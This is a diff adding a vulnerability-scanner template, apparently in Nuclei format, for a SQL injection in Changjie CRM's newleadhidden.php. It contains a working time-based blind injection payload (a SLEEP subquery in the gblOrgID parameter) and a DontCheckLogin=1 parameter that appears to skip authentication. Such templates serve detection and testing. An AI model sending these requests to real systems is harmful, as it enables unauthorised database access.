@@ -1,0 +1,49 @@
+id: poc-yaml-changjie-crm-newleadhidden-php-sqli
+info:
+  name: Changjie CRM newleadhidden.php SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(5, 10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - id: "initial-check"
+    method: GET
+    path:
+      - "{{BaseURL}}/lead/newleadhidden.php?gblOrgID=1'&DontCheckLogin=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Fatal error"
+
+  - id: "sqli-check"
+    method: GET
+    path:
+      - "{{BaseURL}}/lead/newleadhidden.php?gblOrgID=1+AND+(SELECT+5244+FROM+(SELECT(SLEEP({{t1}})))HAjH)--+-&DontCheckLogin=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"select\":"
+          - "Lead"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: dsl
+        dsl:
+          - "duration > t1"
+          - "duration < t2"
